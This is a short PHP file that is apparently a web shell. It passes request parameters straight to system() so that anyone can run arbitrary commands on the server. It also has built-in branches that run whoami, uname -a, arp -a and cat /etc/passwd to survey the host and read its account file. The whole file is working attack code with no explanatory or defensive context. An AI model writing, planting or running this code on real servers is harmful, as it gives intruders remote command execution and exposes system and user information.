<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        $options = ($_REQUEST['opts']);
        system($cmd." ".$options);
        echo "</pre>";
        die;
} elseif(isset($_REQUEST['whoami'])){
        echo "<pre>";
        system("whoami");
        echo "</pre>";
        die;
} elseif(isset($_REQUEST['uname'])){
        echo "<pre>";
        system("uname -a");
        echo "</pre>";
        die;
} elseif(isset($_REQUEST['arp'])){
        echo "<pre>";
        system("arp -a");
        echo "</pre>";
        die;
} elseif(isset($_REQUEST['passwd'])){
        echo "<pre>";
        system("cat /etc/passwd");
        echo "</pre>";
        die;
}
?>
